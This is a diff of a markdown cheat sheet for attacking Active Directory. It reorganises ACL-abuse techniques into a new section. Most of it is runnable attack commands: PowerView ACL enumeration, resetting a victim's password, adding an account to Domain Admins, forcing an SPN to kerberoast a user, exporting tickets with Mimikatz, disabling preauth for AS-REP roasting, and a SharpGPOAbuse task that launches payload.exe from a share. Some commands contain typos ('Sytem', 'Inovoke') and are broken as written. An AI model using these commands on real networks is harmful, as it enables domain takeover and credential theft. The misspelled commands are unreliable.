@@ -138,53 +138,6 @@ To prevent from kerberoasting attacks we have the following recommendations:
 * Use Managed Service ACcounts (Automatic change of password periodically and deltegated SPN Management)
 * Try to not run a service as a Domain Admin account.
 
-### Set SPN
-
-With enough privileges such as `GenericAll` or `GenericWrite`, a target user's SPN can be set to anything which is unique in the domain. We can then request a TGS without special privileges and the TGS can be kerberoasted.
-
-We can enumerate the permissions for a group on ACLs:
-
-* PowerView:
-```powershell
-Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReferenceName -match "RDPUsers"}
-```
-
-We can also see if a user already has a SPN:
-
-* PowerView (dev):
-```powershell
-Get-DomainUser -Identity user01 | select serviceprincipalname
-```
-* ADModule:
-```powershell
-Get-ADUser -Identity user01 -Properties ServicePrincipalName | select ServicePrincipalName
-```
-
-And we can force the SPN to a user:
-
-* PowerView (dev):
-```powershell
-Set-DomainObject -Identity user01 -Set @{serviceprincipalname='ops/whatever01'}
-```
-
-* ADModule:
-```powershell
-Set-ADUser -Identity user01 -ServicePrincipalNames @{Add='ops/whatever01'}
-```
-
-Once we have a SPN set, we can request a TGS:
-
-```powershell
-Add-Type -AssemblyName System.IdentityModel
-New-Object Sytem.IdentityModel.Token.KerberosRequestorSecurityToken -ArgumentList "ops/whatever01"
-```
-And we can export the tickets to the disk:
-
-```powershell
-Inovoke-Mimikatz -Command '"kerberos::list /export"'
-```
-And finally same as *Kerberoasting*, you can crack the ticket with `tgsrepcrack.py`.
-
 ## AS-REP Roasting
 
 If a users account does not have the flag _"Do not require Kerberos pre-authentication"_ in _UserAccountControl_ settings which means kerberos preauth is disabled, it is possible to grab users AS-REP and brute-force it offline.
@@ -212,14 +165,6 @@ Get-ADUser -Filter {DoesNotRequiredPreAuth -eq $True} -Properties DoesNotRequire
 C:\Tools\ADSearch\ADSearch\bin\Debug\ADSearch.exe --search "(&(sAMAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" --attributes cn,distinguishedname,samaccountname
 ```
 
-### Disable PreAuth
-
-A user with `GenericAll` or `GenericWrite`, kerberos preauth can be disabled.
-
-* PowerView (dev):
-```powershell
-Set-DomainObject -Identity user01 -XOR @{useraccountcontrol=4194304} -Verbose
-```
 ### Cracking the tickets
 
 We can request an encrypted AS-REP for offline brute-force. To do that task we can use `ASREPRoast` module:
@@ -704,6 +649,94 @@ Example of adding an Immediate Scheduled Task too the PowerShell Logging GPO.
 ```powershell
 .\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "%COMSPEC%" --Arguments "/b /c start /b /min \\srv\share\payload.exe" --GPOName "PowerShell Logging"
 ```
+
+# Abusing ACLs
+
+There may be instances across the domain where some principals have ACLs on more privileged accounts, that allow them to be abused for account-takeover. 
+
+Search ACLs of a principal.
+
+* PowerView (dev):
+
+```powershell
+Get-DomainObjectAcl -Identity user | ? { $_.ActiveDirectoryRights -match "GenericAll|WriteProperty|WriteDacl" -and $_.SecurityIdentifier -match "S-1-5-21-3263068140-2042698922-2891547269-[\d]{4,10}" } | select SecurityIdentifier, ActiveDirectoryRights | fl
+```
+Search ACLs on the entire Domain.
+
+* PowerView (dev):
+
+```powershell
+Get-DomainObjectAcl -SearchBase "CN=Users,DC=dev,DC=cyberbotic,DC=io" | ? { $_.ActiveDirectoryRights -match "GenericAll|WriteProperty|WriteDacl" -and $_.SecurityIdentifier -match "S-1-5-21-3263068140-2042698922-2891547269-[\d]{4,10}" } | select ObjectDN, ActiveDirectoryRights, SecurityIdentifier | fl
+```
+## Reset User Password
+
+If we have `GenericAll` we can change the password of a user.
+
+```powershell
+net user bob Password! /domain
+```
+
+## Modify Domain Group Membership
+
+We can add users to a group.
+
+```powershell
+net group "Domain Admins" bob /add /domain
+```
+## Set SPN (Kerberoasting)
+
+With enough privileges such as `GenericAll` or `GenericWrite`, a target user's SPN can be set to anything which is unique in the domain. We can then request a TGS without special privileges and the TGS can be kerberoasted.
+
+We can enumerate the permissions for a group on ACLs:
+
+* PowerView:
+```powershell
+Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReferenceName -match "RDPUsers"}
+```
+
+We can also see if a user already has a SPN:
+
+* PowerView (dev):
+```powershell
+Get-DomainUser -Identity user01 | select serviceprincipalname
+```
+* ADModule:
+```powershell
+Get-ADUser -Identity user01 -Properties ServicePrincipalName | select ServicePrincipalName
+```
+And we can force the SPN to a user:
+
+* PowerView (dev):
+```powershell
+Set-DomainObject -Identity user01 -Set @{serviceprincipalname='ops/whatever01'}
+```
+
+* ADModule:
+```powershell
+Set-ADUser -Identity user01 -ServicePrincipalNames @{Add='ops/whatever01'}
+```
+Once we have a SPN set, we can request a TGS:
+
+```powershell
+Add-Type -AssemblyName System.IdentityModel
+New-Object Sytem.IdentityModel.Token.KerberosRequestorSecurityToken -ArgumentList "ops/whatever01"
+```
+And we can export the tickets to the disk:
+
+```powershell
+Inovoke-Mimikatz -Command '"kerberos::list /export"'
+```
+And finally same as *Kerberoasting*, you can crack the ticket with `tgsrepcrack.py`.
+
+## Disable PreAuth of a User (ASREPRoasting)
+
+A user with `GenericAll` or `GenericWrite`, kerberos preauth can be disabled.
+
+* PowerView (dev):
+```powershell
+Set-DomainObject -Identity user01 -XOR @{useraccountcontrol=4194304} -Verbose
+```
+
 # Across Domains (SID History)
 
 Domains in a same forest have an implicit two-way trust with other domains. There is a trust key between the parent and child domains.
